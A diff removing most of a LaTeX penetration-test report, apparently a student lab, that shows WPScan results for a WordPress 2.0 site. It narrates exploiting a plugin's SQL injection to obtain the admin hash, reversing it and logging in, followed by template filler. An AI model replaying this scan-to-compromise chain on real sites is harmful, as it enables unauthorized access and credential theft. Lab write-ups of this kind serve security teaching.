-    \  /\  /  | |     ____) | (__| (_| | | | |
-     \/  \/   |_|    |_____/ \___|\__,_|_| |_| v1.1
-
-  WordPress Security Scanner by ethicalhack3r.co.uk
- Sponsored by the RandomStorm Open Source Initiative
-_____________________________________________________
-
-
-| URL: http://bwa.sait230.ca/wordpress/
-| Started on Fri Feb 12 14:40:44 2016
-
-[!] The WordPress theme in use is called "default".
-[!] The WordPress "http://bwa.sait230.ca/wordpress/readme.html" file exists.
-[!] WordPress version 2.0 identified from meta generator.
-
-[+] Enumerating installed plugins...
-
-Checking for 2892 total plugins... 100% complete.
-
-[+] We found 2 plugins:
-
-Name: mygallery
-Location: http://bwa.sait230.ca/wordpress/wp-content/plugins/mygallery/
-Directory listing enabled? Yes.
-
-Name: wpSS
-Location: http://bwa.sait230.ca/wordpress/wp-content/plugins/wpSS/
-Directory listing enabled? Yes.
-
-[+] There were 1 vulnerabilities identified from the plugin names:
-
-[!] Wordpress Plugin Spreadsheet <= 0.6 SQL Injection Vulnerability
-* Reference: http://www.exploit-db.com/exploits/5486/
-
-[+] Finished at Fri Feb 12 14:40:49 2016
-\end{lstlisting}
-
-\newpage
-wpscan has detected 1 vulnerable plugin that will allow SQL injection. So I went
-to exploit db to get the details for this vulnerability.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/wp-exploitdb.png}
-	\caption{wordpress sqlinjection exploit.}
-	\label{fig:wordpress1}
-\end{figure}
-
-\newpage
-\paragraph{SQL Injection}
-Then I crafted the url to exploit the SQL injection vulnerability.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/wp-admin-credentials.png}
-	\caption{wordpress sql injection admin credentials.}
-	\label{fig:wordpress2}
-\end{figure}
-
-Using the SQL injection vulnerability I was able to get the admin credentials for this wordpress site.\ 
-
-username: admin
-password: 21232f297a57a5a743894a0e4a801fc3
-email: admin@example.org
-
-\newpage
-I then took the MD5 hash for the admin account and looked up the reversed value for it.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/wp-admin-md5.png}
-	\caption{wordpress reverse md5 hash.}
-	\label{fig:wordpress3}
-\end{figure}
-
-\newpage
-Next I logged in to the wordpress site.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/wp-logged-in.png}
-	\caption{wordpress dashboard.}
-	\label{fig:wordpress4}
-\end{figure}
-
-\newpage
-\subsection{Exploits for ultimatelamp.sait230.ca}
-
-\newpage
-\section{Conclusion}
-\subsection{Recommendations}
-\subsection{Risk Rating}
-
-\newpage
-\section{Appendix A: Vulnerability Detail and Mitigation}
-\subsection{Risk Rating Scale}
-\subsection{Unprotected WP-Admin Access}
-\subsection{Vulnerable Wordpress Search Plugin}
-
-\begin{equation*}
-	f(x) = x^2
-\end{equation*}
-
-This is some example text\footnote{\label{myfootnote}Hello footnote}.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/screenshot.png}
-	\caption{A boat.}
-	\label{fig:boat1}
-\end{figure}
-
-Figure~\ref{fig:boat1} shows a boat.
-
-\begin{table}[h!]
-	\centering
-	\caption{Caption for the table.}
-	\label{tab:table1}
-	\begin{tabular}{l|c||r}
-		1 & 2 & 3\\
-		\hline
-		a & b & c\\
-	\end{tabular}
-\end{table}
-
-I'm referring to footnote~\ref{myfootnote}.
-
-\begin{table}[h!]
-	\centering
-	\caption{Caption for the table.}
-	\label{tab:table2}
-	\begin{tabular}{ccc}
-		\toprule
-		Some & actual & content\\
-		\midrule
-		prettifies & the & content\\
-		as & well & as\\
-		using & the & booktabs package\\
-		\bottomrule
-	\end{tabular}
-\end{table}
-
-\newpage
-\begin{table}
-	\caption{Dummy table}
-\end{table}
-
-\newpage
-\begin{table}[h!]
-	\begin{center}
-		\caption{Autogenerated table from csv file}
-\label{table4}
-		\pgfplotstabletypeset[
-			multicolumn names, % allows to have multicolumn names
-			col sep=comma, % the seperator in our .csv file
-			display columns/0/.style={column name=$Value 1$, column type={S},string type},
-			display columns/1/.style={column name=$Value 2$, column type={S},string type},
-			every head row/.style={before row={\toprule}, after row={\si{\ampere} & \si{\volt}\\ \midrule}},
-			every last row/.style={after row=\bottomrule}, % rule at bottom
-		]{table.csv} % filename/path to file
-	\end{center}
-\end{table}
-
-\newpage
-\begin{figure}[h!]
-  \begin{center}
-    \begin{tikzpicture}
-      \begin{axis}[
-          width=\linewidth,
-          grid=major,
-          grid style={dashed,gray!30},
-          xlabel=X Axis $U$,
-          ylabel=Y Axis $I$,
-          x unit=\si{\volt},
-          y unit=\si{\ampere},
-          legend style={at={(0.5,-0.2)},anchor=north},
-          x tick label style={rotate=90,anchor=east}
-        ]
-        \addplot
-        % select columns by using actual column names in csv.
-        table[x=column 1,y=column 2, col sep=comma] {table.csv};
-        \legend{Plot}
-      \end{axis}
-    \end{tikzpicture}
-    \caption{My first autogenerated plot.}
-  \end{center}
-\end{figure}
-
-\newpage
-\begin{figure}[h!]
-  \begin{center}
-    \begin{tikzpicture}
-      \draw [red,dashed] (-2.5,2.5) rectangle (-1.5,1.5) node [black,below] {Start};
-      \draw [thick] (-2,2)
-      to [out=10,in=190] (2,2)
-      to [out=10,in=90] (6,0)
-      to [out=-90,in=30] (-2,-2);
-      \draw [fill] (5,0.1) rectangle (7,-0.1) node [black,right] {Obstacle};
-      \draw [red,fill] (-2,-2) circle [radius=0.2] node [black,below=4] {Point of interest}; % draw a circle
-    \end{tikzpicture}
-    \caption{Example graphic made with tikz.}
-  \end{center}
-\end{figure}
-
-\newpage
-Perl code
-\lstinputlisting[language=Perl]{script.pl}
-
-Ruby code
-\lstinputlisting[language=Ruby]{script.rb}
-
-Bash script
-\lstinputlisting[language=Bash]{script.sh}
-
-\newpage
 \begin{appendix}
 	\listoffigures
-	\listoftables
 \end{appendix}
 
 \end{document}
